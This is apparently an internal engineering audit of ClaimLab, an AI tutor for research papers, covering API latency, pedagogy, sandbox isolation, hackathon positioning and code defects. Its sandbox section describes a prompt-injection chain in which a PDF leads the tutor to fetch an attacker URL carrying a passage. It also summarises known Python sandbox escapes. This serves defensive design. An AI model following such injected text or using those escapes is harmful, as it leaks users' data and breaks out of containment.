# Cut round trips, verify claims, contain code

ClaimLab gets faster, sharper and safer from one move applied five ways: take decisions out of muse-spark-1.3's sequential tool loop, give them to reviewed code, and show the learner verified work as it happens. A live turn chains up to seven Meta calls, and on Chat Completions each one reasons from scratch. Observed turns took 17–50 s, with a 12–23 s final lesson reply. ClaimLab sets no `reasoning_effort` and streams nothing, and in one turn it spent about 22 s grading a single free-text answer in a separate round. Meta documents every missing lever: per-call reasoning effort, streamed tool-call arguments, prefix caching, constrained structured output and parallel tools. Using them also earns points under the 25% "Use of Meta AI Tooling" criterion. On pedagogy, the evidence favours answering the paper question first, with a worked example in the paper's own numbers, and withholding only inside the check loop. Check variants, private keys and misconception-tagged distractors should be generated up front, so that grading becomes instant code instead of another model round. Isolation is the weakest layer. The Python policy is a denylist filter over a child process that runs as the user, `read_web_page` will fetch any URL the model names, and no judge-reachable build should ship without a container, gVisor or microVM boundary underneath. Positioning depends on clearing the participant guide's pass/fail Stage 1 screen, whose list of projects to avoid includes "Simple 'AI for Education' Chatbots". ClaimLab's defensible edge is turning a paper's claim into a runnable experiment with PDF-verified quotes, which neither the Socratic study modes nor the hours-long reproduction agents offer. Two codebase findings are the most urgent. The sandbox, lesson-builder and web-research modules exist only in the uncommitted working tree, and the job worker and SSE route that every perceived-latency fix depends on are broken. The team's feature freeze is 2 November, 22:00 IST, and submission closes 4 November, 9 PM ET (07:30 IST on 5 November). Before then: commit and measure, move grading into code, run turns in the background behind a staged progress strip, and build one claim-check demo moment. gVisor or microVM isolation, the Responses API migration, budgets, retention sweeps and refactors belong to the hosted release.

## Seven sequential reasoning rounds, not ClaimLab's code, set the wait

Almost none of a turn's time is spent in ClaimLab's own code. Reading the orchestrator gives roughly 30–50 small SQLite statements and 10–15 WAL commits per turn, which adds up to milliseconds. The time goes to **up to seven sequential calls** to muse-spark-1.3 (`MAX_LIVE_ITERATIONS = 7`), with a 60 s soft deadline checked only before each call ([agent_orchestrator.py](../backend/src/claimlab/services/agent_orchestrator.py)). In the user's 31 October session, the first turn made six sequential tool calls and turns took **33–50 s**. Replays after the prompt fixes ran **17.3–45.8 s**. The final `present_lesson` reply alone took **12–23 s**, and one free-text answer spent **about 22 s in a separate `assess_answer` reply** before a 23 s lesson ([status and handoff](../docs/25_STATUS_AND_HANDOFF.md)). Every one of these numbers is a single observation, not a percentile. Each call also re-sends about 22–28k characters of fixed context: a 3.2k-character system prompt, 2.3–6.1k of tool JSON and up to 14k of source. At a rough 4 characters per token, a six-call turn sends 40–70k input tokens.

Meta's documentation explains why these rounds are expensive. On Chat Completions, `reasoning_content` is redacted for external keys, so **each round reasons from scratch**. Meta recommends its Responses API for tool loops because that API carries reasoning across tool turns ([Meta: Reasoning](https://dev.meta.ai/docs/reasoning); [Meta: Tool calling](https://dev.meta.ai/docs/tool-calling)). ClaimLab's payload sends only `model`, `messages`, `tools`, `tool_choice: "auto"` and `max_tokens: 8192`, and `max_tokens` is now a deprecated alias for `max_completion_tokens` ([Meta: Chat Completions](https://dev.meta.ai/docs/protocols/chat-completions)). Without `reasoning_effort`, Spark reasons at a "model-determined level". Meta advises "the lowest level that gives you acceptable results" and suggests `low` for direct-answer tasks ([Meta: Reasoning](https://dev.meta.ai/docs/reasoning)). OpenAI's latency guide supplies the ranking logic. Generating tokens is "almost always the highest latency step": halving output tokens cuts latency by about half, while halving the prompt gains only 1–5%, and every request removed saves a whole round ([OpenAI latency guide](https://developers.openai.com/api/docs/guides/latency-optimization)). The levers that matter are therefore round trips and reasoning or output tokens, not prompt trimming.

| Where the time goes | Lever | Real or perceived | Evidence status |
|---|---|---|---|
| Up to 7 sequential rounds, each reasoning from scratch | `reasoning_effort` per call (`low` for code and lesson, `minimal` for grading); later, the Responses API with reasoning carried forward | Real | Trade-off documented by Meta; size on Spark 1.3 unmeasured |
| A separate ~22 s `assess_answer` reply | Grade choice and numeric checks in code; put any assessment inside the lesson schema | Real | One observation; the same-reply prompt not yet seen live |
| Several tools in one reply run one after another | Thread pool for sandbox and web calls; DB writes stay on the turn thread | Real | Confirmed in code; saves the sum minus the slowest tool |
| 22–28k characters re-sent each round, with a tool list that changes between rounds | Constant tool list, static content first, `prompt_cache_key` per source; trim feedback-turn context | Real (small), cost (large) | Prefix caching documented; Meta's serialisation order unverified |
| A 12–23 s final lesson arrives all at once | Stream tool-call deltas; emit each validated step as it completes; keep the answer key on the server | Perceived | Delta streaming documented; field names and pre-content reasoning pause not probed |
| A blank wait behind a seconds counter | Background job with a staged progress strip; show the experiment result as soon as the run finishes | Perceived | NN/g thresholds; needs the worker and SSE fixes |

Real-latency work should start with measurement, because the ranking above is partly a hypothesis. Meta reports `reasoning_tokens` and `cached_tokens` in each call's `usage` ([Meta: Reasoning](https://dev.meta.ai/docs/reasoning); [Meta: Prompt caching](https://dev.meta.ai/docs/cookbook/prompt-caching)). ClaimLab's probe script already reads token usage, but the orchestrator throws it away ([probe_meta_api.py](../backend/src/claimlab/scripts/probe_meta_api.py)). Logging those fields with wall time for each round would show, for the first time, whether the 12–23 s lesson reply is mostly hidden reasoning, which favours lower effort, or visible output, which favours shorter lessons and streaming. Lowering effort is a one-line change, but its payoff is unproven: a third-party probe recorded an identical 197 reasoning tokens at `low` and `high` on a trivial prompt ([harn-vm Meta catalog](https://docs.rs/crate/harn-vm/0.10.170/source/src/llm/catalog_sources/60-models/12-meta.toml)). It has to be tested on real lesson prompts, with lesson quality checked alongside.

Removing the grading round is a surer win. The prompt now asks for `assess_answer` and `present_lesson` in one reply, but that "has not been observed live" ([status and handoff](../docs/25_STATUS_AND_HANDOFF.md)). Grading choice and numeric checks in code removes the reliance on the model complying (Section 2 shows how).

Concurrency comes next. Meta's `parallel_tool_calls` is on by default, yet ClaimLab runs the tools in one reply through a single sequential `for` loop. A thread pool for the sandbox and web calls turns the sum of their times into the time of the slowest ([Meta: Tool calling](https://dev.meta.ai/docs/tool-calling)).

Prefix caching mostly saves money, not seconds. The cache is automatic and prefix-based, and "the first token that differs ends the match". A stable `prompt_cache_key` raises hit rates, while "a unique key per user or session … lowers your hit rate" ([Meta: Prompt caching](https://dev.meta.ai/docs/cookbook/prompt-caching)). ClaimLab rebuilds its tool list on every iteration through `live_tools(...)`, which probably ends the shared prefix early. The fix is a constant tool list, with restrictions enforced in the tool handlers, plus a cache key per source. A third-party provider page prices cached input at $0.15 per million tokens, against Meta's $1.25 list price ([OpenClaw](https://docs.openclaw.ai/providers/meta); [Meta dev blog](https://dev.meta.ai/resources/blog/build-with-muse-spark/)).

The last lever concerns the final call. `tool_choice` accepts only `"auto"`: `"required"` and named functions return HTTP 400, so the model can never be forced to call `present_lesson`. A last-round call with no tools and a `response_format` JSON schema uses constrained decoding to guarantee the lesson's shape and stops stray extra rounds. Meta does not document whether that mode streams ([Meta: Tool calling](https://dev.meta.ai/docs/tool-calling); [Meta: Structured output](https://dev.meta.ai/docs/cookbook/structured-output)).

Perceived latency is the bigger and more certain win. Nielsen puts 10 s at the limit of holding attention, and NN/g recommends a percent-done indicator for waits of 10 s or more. In the study NN/g cites, users shown an animated progress bar were **willing to wait about three times longer** ([NN/g response times](https://www.nngroup.com/articles/response-times-3-important-limits/); [NN/g progress indicators](https://www.nngroup.com/articles/progress-indicators/)). These sources are old, but no newer study of tutor waits replaces them. ClaimLab's 17–50 s turns show only "The tutor is reading your pages and writing an answer… N s". The hint button waits for a full live turn before revealing a static strategy written on the client ([TaskCard.tsx](../frontend/src/components/TaskCard.tsx)). Each stage the orchestrator already knows about can become an honest progress step with no fake timer: reading the source, writing an experiment (with the code streaming into a collapsed panel), running it, searching a named site, and composing step k of n. Rendering the experiment result card the moment a run returns turns the code-writing wait into visible work.

Streaming the lesson is the largest perceived gain, and Meta documents it: "tool-call arguments arrive as deltas too", accumulated by `index` on Chat Completions ([Meta: Streaming](https://dev.meta.ai/docs/cookbook/streaming-responses)). The server can run `pydantic_core.from_json(buffer, allow_partial=True)` over the growing argument string. That function has existed since Pydantic 2.7, and 2.9.2 is installed. Because partial mode cannot tell a complete string from a cut-off one, the server should treat step k as final only once step k+1 begins, then validate it and emit a `lesson_step` event ([Pydantic partial JSON](https://pydantic.dev/docs/validation/dev/concepts/experimental/)). Raw deltas must never reach the browser, because the `present_lesson` arguments contain the answer key that ClaimLab keeps on the server only.

Meta's own caveats limit the gain. A reasoning-heavy prompt "can pause before content streams", and a retry "restarts the stream from the beginning" ([Meta: Streaming](https://dev.meta.ai/docs/cookbook/streaming-responses)). If most of the 12–23 s is silent reasoning, cutting effort matters more than streaming, which is why measurement comes first. None of the perceived-latency work can ship until turns run as background jobs, and the existing job path is broken (Section 5).

## Answer first, then withhold only inside the check loop

The 31 October complaint was that answers were "slow, abstract, and not to the point". The logs showed several faults. Steps were telegraphic ("Daily keeps 1 point per day."). The context never asked the tutor to answer the learner's question. The tutor sometimes repeated a check after a wrong answer. One turn invented run details because its context held only run ids ([status and handoff](../docs/25_STATUS_AND_HANDOFF.md)). The same day's prompt rewrite (answer first, include a worked example, 3–5 steps of 2–5 sentences) fixed the first two in replays.

Prompt-only fixes drift, though. OpenAI admits its instruction-based study mode "may result in inconsistent behavior and mistakes across conversations" ([The Decoder](https://the-decoder.com/openai-launches-study-mode-for-chatgpt-while-education-users-are-told-to-wait-and-learn-later/)). Khan Academy found that once prompts grow long, "the model starts randomly ignoring different parts of the instructions" ([Khan Academy](https://blog.khanacademy.org/pt-br/?p=19535)). Khanmigo users complained about repeated questions, the same fault ClaimLab shows ([Khanmigo prompt engineering](https://blog.khanacademy.org/khan-academys-7-step-approach-to-prompt-engineering-for-khanmigo)). The lasting fix is to make the pedagogy structural, enforced in code rather than requested in a prompt.

On the central design question, the evidence does not support blanket Socratic withholding for a learner who asks what a paper claims. In Bastani et al.'s field experiment with about 1,000 students, a ChatGPT-like tutor **cut later grades by 17%** once access was removed. But the harm came from the AI doing the practice problems for students, and a safeguarded "GPT Tutor" largely removed it ([Wharton Knowledge](https://knowledge.wharton.upenn.edu/article/without-guardrails-generative-ai-can-harm-education); [IDEAS/RePEc](https://ideas.repec.org/a/nas/journl/v122y2025pe2422633122.html)). Kestin et al.'s crossover RCT with 194 Harvard physics students found that a structured GPT-4 tutor produced **more than twice the learning gain** of in-class active learning. Its prompt was two paragraphs, with rules such as "Only give away ONE STEP AT A TIME" and "Keep responses BRIEF" ([AIED Research](https://aiedresearch.substack.com/p/ai-tutoring-outperforms-active-learning)). In Pardos and Bhandari's RCT (N = 274), ChatGPT worked-solution help was the only condition with significant gains over no help ([PMC](https://www.ncbi.nlm.nih.gov/pmc/articles/PMC11125466/)). The expertise reversal effect adds a limit: worked examples help novices most and become redundant, even harmful, as knowledge grows ([Expertise reversal effect](https://en.wikipedia.org/wiki/Expertise_reversal_effect)).

The rule that fits ClaimLab is **answer first on explanation turns, and withhold only inside the check and remediation loop**. Code, not the model, should choose the mode. A "what does the paper say" question gets the answer and a verified quote in step 1. A "why does it follow" question gets the answer, a worked example in the paper's own numbers, and a check that applies the idea to a slightly changed case. Support should fade with ClaimLab's existing evidence categories: a full worked example at `introduced`, a partial example the learner completes at `supported_with_help`, and a short answer with a source pointer at `supported_independently`.

The case for withholding deserves a fair hearing. Productive-failure research favours problem-first designs for conceptual transfer. One summary of a meta-analysis reports a bias-adjusted g = 0.87, but two randomised experiments found the opposite ([phys.org](https://phys.org/news/2021-09-productively-wiser.html)). ClaimLab can capture that benefit cheaply by asking the learner to predict the plot's shape before an experiment result appears, without holding back the answer to the question they asked.

Feedback after a wrong answer is where ClaimLab can gain the most. In Van der Kleij et al.'s meta-analysis of 40 studies, **elaborated feedback scored ES = 0.49, the correct answer alone 0.32, and right/wrong alone 0.05**, and elaborated feedback was strongest on higher-order outcomes ([ACU Research Bank](https://acuresearchbank.acu.edu.au/item/86y84/effects-of-feedback-in-a-computer-based-learning-environment-on-students-learning-outcomes-a-meta-analysis)). A 2022 network meta-analysis reached the same ranking ([IPN Leibniz](https://www.leibniz-ipn.de/en/research/publications/effects-of-computer-based-feedback-on-lower-and-higher-order-learning-outcomes)). A bare "incorrect, try again" is nearly worthless. On a first miss, the remediation turn should name the error and where it occurs, give one targeted hint or counter-example from the paper without revealing the answer, and pose a **new variant**. On a second miss, it should reveal the answer with a worked explanation. It should never re-serve an item.

Mayer's multimedia principles map directly onto the paged steps and the whiteboard. Paging already applies segmenting (d ≈ 0.70). Coherence, signalling and redundancy mean the board carries keywords, equations, verbatim quotes and plots rather than repeating the step's sentences. Every board object should be named in its step's text, and each drawing should appear with its step rather than all at once ([Mayer 2017](https://zendy.io/title/10.1111/jcal.12197)). The Cambridge Handbook reports different medians from Mayer's 2017 figures, so treat these as moderate-to-large effects, not exact sizes ([Cambridge Handbook](https://resolve-he.cambridge.org/core/books/cambridge-handbook-of-multimedia-learning/principles-for-reducing-extraneous-processing-in-multimedia-learning-coherence-signaling-redundancy-spatial-contiguity-and-temporal-contiguity-principles/CD5B7AE1279A9AB81F8EEBB53DBEC86E)).

The best-evidenced generation patterns separate deciding and verifying from writing. Bridge's three-part decision step (infer the error, choose a strategy, state its intention) made GPT-4 responses **76% more preferred and 80% more useful** ([Bridge, NAACL 2024](https://arxiv.org/html/2310.10648v3)). Daheim et al.'s verify-then-generate design produced feedback "more often correct with less hallucinations" ([arXiv 2407.09136](https://arxiv.org/abs/2407.09136)). Self-consistency cut Pardos and Bhandari's hint quality failures from **32% to near 0% in algebra and 13% in statistics** ([PMC](https://www.ncbi.nlm.nih.gov/pmc/articles/PMC11125466/)).

In ClaimLab, these patterns become fields and validators on the one lesson call, not a second planning call that would add a round trip. Step 1 carries `role = "answer"`. At least one `worked_example` step must contain numbers that appear in the selected pages or in a sandbox run. Every `source` step carries a quote that string-matches the PDF, which `lesson_builder` already checks. The check block comes last and is never streamed. It holds at least three variants, each with a private key and with distractors tagged by `misconception_id` and a one-line `why_wrong`. A wrong choice then gets its diagnosis and elaborated feedback from code, with no latency and no variance. Numeric answers first pass through code classifiers for common errors: a factor of 10ⁿ, a sign flip, a reciprocal, or the wrong table row. This is also the place to fix the parser that grades "1/2" as 1 and "50%" as 50 ([lesson_builder.py](../backend/src/claimlab/services/lesson_builder.py)). Free text stays for genuine "why" questions, graded against a key-point list away from the critical path.

Here the latency and pedagogy agendas meet. Putting the direct answer first makes the first streamed step the most useful one. Pre-generated variants remove both the repeated-check fault and the 22 s grading round.

None of this should be trusted without measurement, and the published benchmarks warn against cheap judges. MRBench scores tutor turns on eight dimensions: mistake identification, mistake location, not revealing the answer, guidance, actionability, coherence, tone and human-likeness. In that study, **Prometheus2 and Llama-3.1-8B judges correlated mostly negatively with human raters**, while human annotators agreed at κ = 0.71 ([MRBench, NAACL 2025](https://arxiv.org/html/2412.09416v2)). MathTutorBench adds that subject expertise "does not immediately translate to good teaching" ([arXiv 2502.18940](https://arxiv.org/abs/2502.18940)). Google's 25-item LearnLM arena rubric turns the "not to the point" complaint into scorable items such as "straightforward response", "information order", "no repetition" and "no irrelevant information" ([LearnLM arena](https://arxiv.org/html/2505.24477v1)).

A harness worth building takes about two days and has four parts:

- **Scenarios.** 20–30 of them, each with a paper, pages, a question, a mastery state, and scripted correct, misconceived, off-topic and "I don't know" answers.
- **Deterministic checks.** Run on every sample.
- **A judge per dimension.** Adopt one only after two people label about 60 turns and their agreement with the judge is measured.
- **Five runs per scenario.** Variance then becomes a number rather than an impression.

ClaimLab's existing live benchmark passed 12 of 12 cases on 27 October. It exercises the reviewed attention-lab path, though, and predates the 31 October open-lesson changes ([benchmark report](evaluation_benchmark_report.json)). The same harness can supply the latency table and the evaluation panel for the judges, so it is worth building once and reusing.

## A Python denylist is standing in for a missing sandbox boundary

ClaimLab's sandbox is a capable filter with no boundary underneath it. Tutor-written code passes an AST and import policy, then runs in an isolated `-I -S` interpreter from a dedicated `.sandbox-venv`. On Windows the process sits in a Job Object, and on POSIX in a process group ([executor.py](../backend/src/claimlab/sandbox/executor.py)). The Job Object limits memory and time, but it does not control access. At the operating-system level the child runs as the logged-in user, so any code that gets past the Python policy can reach the user's files and the network. If the venv is missing, the executor falls back to the application's own interpreter and site-packages and only logs a warning.

The policy is an attribute **denylist** over numpy's large surface, and it has already needed patching: its own comment records that `numpy.ma.mrecords.openfile` "opened any path" ([policy.py](../backend/src/claimlab/sandbox/policy.py)). The risk register names one exfiltration chain: a file read, returned in results, then sent out in a web query. A wider channel sits next to it. `read_web_page` fetches any http(s) URL the model names, so a prompt injection hidden in a PDF or web page can make the tutor request `https://attacker/?q=<passage>` without any sandbox escape at all ([agent_orchestrator.py](../backend/src/claimlab/services/agent_orchestrator.py); [risk register](../docs/22_DECISIONS_AND_RISKS.md)).

The public record shows that filtering inside the language keeps failing:

- **Cyera, August 2026.** Its research broke seven products that ran Python in Pyodide or WebAssembly, including n8n, Grist and smolagents, with CVEs scored up to 9.9. "ctypes was available in all seven configurations", and walking `object.__subclasses__()` recovered `__builtins__`. Its advice: "Treat Python-level restrictions as one layer of defense in depth, not the sole boundary" ([Cyera](https://www.cyera.com/research/sandcastles-not-sandboxes-how-one-architectural-flaw-exposed-seven-products)).
- **asteval, 2025.** Its numpy integration exposed `ndarray.ctypes`, which gave native memory read/write ([Full Disclosure](https://seclists.org/fulldisclosure/2025/Mar/0)).
- **RestrictedPython.** A `try/except*` type-confusion bypass (CVE-2025-22153) and a `string.Formatter` escape (CVE-2026-76825) ([Wiz](https://www.wiz.io/vulnerability-database/cve/cve-2025-22153); [SOCRadar](https://socradar.io/free-tools/cve-radar/CVE-2026-76825)).
- **pysandbox, 2013.** Its author judged the approach "broken by design" ([LWN](https://lwn.net/Articles/574323/)).

ClaimLab already blocks every primitive in that catalogue. The lesson is about structure, not missing names. The policy's proper job is fast, friendly rejection of bad code, and over time it should become an allowlist of permitted numpy callables per module. The real boundary has to sit below Python.

| Option | Boundary below Python | Files and network by default | Setup effort | Best fit |
|---|---|---|---|---|
| Current: AST policy, `-I -S` venv, Job Object | None; the child runs as the user | Both reachable | Done | Fast rejection of bad code only |
| Windows LPAC AppContainer with zero capabilities, plus Job Object | Token and ACL boundary on the same kernel | Files denied unless ACL-granted; no network | 0.5–1.5 days; not tested with CPython and numpy | Laptop demo |
| Hardened Docker (runc) | Namespaces, cgroups, seccomp; shared kernel | `--network none`; read-only image | About 0.5 day | Single-tenant Linux demo |
| Docker plus gVisor `runsc` | User-space kernel above the host kernel | Same as Docker | About 0.5 day more | Self-hosted multi-user |
| Firecracker or Kata, self-hosted | Hardware VM (KVM) | Guest filesystem only | Days to weeks | Compliance-grade hosting |
| E2B, Modal or Cloudflare (managed) | Firecracker microVM; gVisor or VM; microVM | Internet **on** until disabled | Hours to about a day | Fastest VM-grade boundary |
| Pyodide in the learner's browser | Browser sandbox on the learner's machine | No server exposure | 1–2 days | Optional "play" runs; results can be forged |

The options trade boundary strength against setup time:

- **AppContainer.** With zero capabilities, an AppContainer gets no network and only the files its SID is explicitly granted, and the less-privileged LPAC variant tightens access checks further ([Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/secauthz/appcontainer-isolation); [blahcat](https://blahcat.github.io/posts/2020/12/29/cheap-sandboxing-with-appcontainers.html); [landstrip](https://docs.rs/crate/landstrip/0.16.9)). No public write-up shows CPython and numpy's OpenBLAS DLLs running inside one, so this is a 0.5–1.5-day experiment with unknown friction.
- **Hardened Docker.** Running with `--network none --read-only --tmpfs /tmp -u 65534 --cap-drop ALL --security-opt no-new-privileges --memory 768m --pids-limit 32` closes both holes, and one community benchmark puts container start at about 42 ms ([OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html); [Docker seccomp](https://docs.docker.com/engine/security/seccomp/); [community benchmark](https://williamzujkowski.github.io/posts/sandboxing-untrusted-containers-with-gvisor-lessons-from-g-fuzz-vulnerability-research)). It still shares the host kernel, and three runc container escapes (CVE-2025-31133, -52565 and -52881) were disclosed in 2025 ([eSecurity Planet](https://www.esecurityplanet.com/news/runc-vulnerability-container-risk/)). On Windows, Docker's own documentation says the Docker Desktop VM under WSL 2 is a weaker boundary than under Hyper-V ([Docker ECI limitations](https://docs.docker.com/enterprise/security/hardened-desktop/enhanced-container-isolation/limitations/)).
- **gVisor.** `runsc` adds a user-space kernel with negligible overhead for CPU-bound work and runs on ordinary VMs without nested virtualisation. Published startup figures conflict: 67 ms in one benchmark, 0.44–0.68 s in another ([gVisor performance guide](https://gvisor.dev/docs/architecture_guide/performance/); [Edera](https://arxiv.org/pdf/2501.04580)).
- **Managed microVMs.** These reach VM-grade isolation fastest. E2B runs each sandbox as a Firecracker microVM, gives $100 of one-time credit without a card, and charges $0.000014 per vCPU-second, so a 10 s run on 1 vCPU and 1 GiB costs about $0.0002. **Every provider surveyed leaves outbound internet on by default**: E2B needs `allow_internet_access=False`, Modal `block_network=True`, and Cloudflare `enableInternet: false` ([E2B pricing](https://e2b.dev/pricing); [E2B internet access](https://docs.e2b.dev/sandbox/internet-access); [Modal networking](https://modal.com/docs/guide/sandbox-networking); [Cloudflare Sandbox](https://developers.cloudflare.com/sandbox/)).

The major vendors agree on the policy even when they don't name the technology. Anthropic's code-execution tool has internet access "Completely disabled", a filesystem limited to the workspace, and numpy preinstalled ([Claude docs](https://platform.claude.com/docs/en/agents-and-tools/tool-use/code-execution-tool)). Gemini caps code execution at 30 s with a fixed set of libraries ([Gemini docs](https://ai.google.dev/gemini-api/docs/code-execution)). According to a published summary of an OpenAI talk, the company's agent-infrastructure team uses Cloud Hypervisor microVMs with warm pools refilled from snapshots ([ZenML summary](https://www.zenml.io/llmops-database/designing-agent-sandbox-infrastructure-at-scale-from-runtime-to-orchestration)).

For the submission, the decision depends on where the demo runs. A demo that runs only on the developer's laptop can accept the shared-kernel risk, provided the cheap application-level guards land first:

- fail closed when the dedicated venv is missing;
- strip API keys from the child's environment;
- cap the results and validate them against a schema of numbers and short labels;
- let `read_web_page` fetch only URLs returned by the same turn's `web_search`;
- reject web queries that contain path-like or high-entropy strings.

The README should then state the threat model plainly.

Any URL that judges can reach changes the answer. Exposing the current child to strangers' PDFs means running model-written code, which prompt injection can steer, as the server's own user. A hosted build therefore needs either a hardened one-shot container (with `runsc` if it installs cleanly) or E2B behind a `SandboxBackend` interface. Either way, it must fail closed rather than fall back. Its negative tests should run with the Python policy switched off and prove that opening a socket and reading the home directory both fail.

The hosted multi-user release should go further:

- gVisor or microVMs on a node pool separate from the API and database;
- network fully off, a read-only image, a non-root user and cgroup limits;
- the cloud metadata address blocked;
- a warm pool of one-shot sandboxes with numpy already imported;
- the escape test corpus running in CI against the real sandbox backend.

## Verification, not visuals, is the edge judges can see in three minutes

The paper-reading market has commoditised summary and chat, and the large assistants converged on the same two features within a year. First came Socratic tutoring: ChatGPT study mode (29 July 2025), Gemini Guided Learning (6 August 2025) and Claude's learning mode (open to all users from August 2025) ([TechCrunch](https://techcrunch.com/2025/07/29/openai-launches-study-mode-in-chatgpt); [9to5Google](https://9to5google.com/2025/08/06/gemini-guided-learning/); [Engadget](https://www.engadget.com/ai/anthropic-brings-claudes-learning-mode-to-regular-users-and-devs-170018471.html)). Then came on-demand visuals: NotebookLM's Video Overviews (July 2025) and Claude's inline interactive charts with sliders (March 2026) ([Google blog](https://blog.google/technology/google-labs/notebooklm-video-overviews-studio-upgrades/); [Claude blog](https://claude.com/resources/articles/claude-builds-visuals)).

At the other extreme, reproduction agents run real code against papers but teach nothing, and they take hours:

- Purdue's July 2026 "Paper-replication" skill matched all 158 claim targets across four papers, with a median of 1.9–6.9 hours per paper ([HF Papers 2607.02134](https://huggingface.co/papers/2607.02134.md)).
- On PaperBench, agents trail expert humans by roughly half ([Emergent Mind](https://www.emergentmind.com/topics/paperbench-benchmark)).
- Paper2Agent turns a paper and its codebase into an MCP server ([HF Papers 2509.06917](https://huggingface.co/papers/2509.06917)).
- Ai2's Asta still lists "experiment replication" as a future capability ([Ai2](https://allenai.org/blog/asta)).

ClaimLab sits in the gap between the two groups. It builds a small mechanism the learner can manipulate within minutes, shows the numpy code, checks quotes verbatim against the PDF, tags each step's evidence type, and grades against a private key under a two-variant rule. No consumer tool surveyed combines these; that absence was inferred from public material, not proven. The nearest thing is a hand-built explainer: Transformer Explainer has passed 490,000 users for a single model ([CHI 2026 paper](https://poloclub.github.io/papers/26-chi-transformer-explainer.pdf)). ClaimLab's pitch is that experience, generated on demand for any paper.

User complaints show where verification pays. NotebookLM users report sources "mixed up", numbers read backwards, and quotes the tool could not find again ([r/notebooklm snapshot](https://reddit.sentinel-team.org/subreddits/notebooklm/snapshots/2026-04-29T12%3A24%3A27.513748Z)), even though a September 2025 study found that NotebookLM hallucinated substantially less than alternatives ([arXiv 2509.25498](https://arxiv.org/abs/2509.25498v1)). Claude's charts draw criticism because the user "cannot see the code, data processing logic, or underlying assumptions behind it" ([The Signal](https://thesignal.substack.com/p/claudes-new-interactive-visuals-are)). One commenter on a paper-chat tool said it "could not explain parts of the equations based on other knowledge outside of the paper" ([HN thread](https://hn.jakechampion.name/item/45212535)). ClaimLab's verbatim quote check, its "background" evidence tag for outside knowledge, and its visible experiment code answer all three complaints.

A CHI 2026 grounding study adds a warning: extra grounding information cluttered its interface and reduced usability ([arXiv 2602.21059](https://arxiv.org/pdf/2602.21059)). Evidence tags should therefore be compact chips with detail on demand. The question judges will ask is "couldn't I just do this in Claude?" The answer has to be verification and pedagogy, because visuals alone no longer stand out.

The judging rules make classification the first risk. The public event page confirms the basics: a virtual hackathon run by Meta and Cerebral Valley, a US$1M prize pool, Indie Developer and Startup tracks, "Build for Your World" and "Push the Frontier" themes, and submissions due **4 November, 9:00 PM ET** ([Cerebral Valley event page](https://events.cerebralvalley.ai/e/meta-ai-developer-hackathon)). The participant guide in the repository adds the details that matter, though it is a user-supplied snapshot that no public page confirms ([participant guide](../gemini-code-1793038385208.md)):

- Stage 1 is a pass/fail screen for theme fit and real use of Meta models built during the event.
- The list of projects to avoid explicitly includes **"Simple 'AI for Education' Chatbots"** and **"Basic RAG Applications"**.
- The three-minute video is "a primary artifact for evaluation".
- The demo may show only work built during the hackathon.

The Push the Frontier theme invites entrants to "accelerate a scientific experiment", which describes ClaimLab's experiment engine far better than an education label. Yet `docs/SUBMISSION_KIT.md` still names a "Developer Tools & Education Track" that exists in neither source, while `docs/19` already recommends Push the Frontier and the Indie Developer track ([submission kit](../docs/SUBMISSION_KIT.md); [hackathon rules](../docs/19_HACKATHON_RULES.md)). Past Meta winners point the same way. At LlamaCon, Best Llama API Usage went to Geo-ML, which turned geology reports into structured data and 3D models, and the Llama 3 runner-up was a multi-agent debate arena ([LlamaCon recap](https://ai.meta.com/blog/llamacon-hackathon/); [Llama 3 recap](https://ai.meta.com/blog/llama-3-hackathon-recap-cerebral-valley/)).

The tooling criterion rewards exactly the latency work. Calling Spark for text and tools is "basic integration". Per-call reasoning effort, streamed tool-call deltas, constrained structured output, parallel tools and prefix caching are documented Meta capabilities that also make ClaimLab faster, so the README and video should list them by name. Spark 1.3 accepts PDF and image input ([Meta models](https://dev.meta.ai/docs/models)). Placing the paper's own figure next to ClaimLab's plot, and asking the learner whether the shapes agree, is an "unexpected capability" moment that needs little new infrastructure. Whether ClaimLab already sends page images to the model was not established. The Meta API also offers native web search with cited answers ([Axios](https://www.axios.com/2026/07/09/meta-ai-spark-model-update-developer)). The demo should either justify using TinyFish on screen or make Meta's search the default, if the switch proves small. A hosted build also needs a region check, because the Meta Model API preview launched for US developers ([Meta dev blog](https://dev.meta.ai/resources/blog/build-with-muse-spark/)).

The most valuable demo moment is a **claim check**. ClaimLab states a claim with its PDF-verified quote, runs the attention-lab experiment, and shows a verdict of "reproduced", "not reproduced" or "beyond what a small model can test", with the tolerance visible. This borrows the Paper-replication skill's discipline of tying each claim to a target and recorded evidence, and showing one honest mismatch builds credibility. Two bonus prizes are within reach. Best Agentic Use-Case ($5K) is judged on "autonomy level, effectiveness, and practical utility", which rewards showing the agent's decision trace. Most Viral ($20K) counts engagement on X through 8 November, which rewards a shareable lesson card ([participant guide](../gemini-code-1793038385208.md)). Audio narration (Meta has no speech synthesis model), multi-paper search and flashcards are commodity features to defer.

## Four verified defects block the background-job path every UX fix needs

The most urgent weakness is not in the code: the repository judges will read does not contain the product being demonstrated. The last commit, on 29 October, contains none of these:

- the `sandbox` package;
- `lesson_builder.py`, `sandbox_runs.py` and `web_research.py`;
- `Markdown.tsx`;
- the tests for any of them.

They sit untracked in the working tree, while the modified `api.py` and `agent_orchestrator.py` already import them. Committing the modified files without the new ones breaks CI. Leaving both uncommitted means the public repository lacks the tutor-written experiments that set ClaimLab apart. The status document's own next step is to commit the working tree, sandbox files included ([status and handoff](../docs/25_STATUS_AND_HANDOFF.md)). Repositories must be public, and judges review the code alongside the video, so this takes hours and comes first.

In the code itself, the background-job machinery exists but cannot run, and the audit reproduced each failure with a throwaway probe:

- **The worker fails every job.** `worker.execute_job` opens a fresh database session and then calls `db.refresh(job)` on a `Job` loaded by a different session. That raises `InvalidRequestError`, so every claimed job fails before it starts. The worker's 30 s lease also has no heartbeat: `HEARTBEAT_INTERVAL_SECONDS` is defined but never used, while turns take 17–90 s ([worker.py](../backend/src/claimlab/worker.py)).
- **The SSE route has no database session.** The route reads the request's `Depends(get_db)` session inside its streaming generator. On the installed FastAPI 0.115.4, the probe showed that session closing **before** the response body ran, which is the documented behaviour for versions before 0.118.0. The generator also makes blocking database calls inside an `async def` function, which stalls the event loop ([api.py](../backend/src/claimlab/api.py); [FastAPI dependencies](https://fastapi.tiangolo.com/advanced/advanced-dependencies/)).
- **Cancellation is cosmetic.** `POST /jobs/{id}/cancel` sets flags and increments `fencing_generation`, but the orchestrator never reads either, and the finished turn overwrites the status with SUCCEEDED.
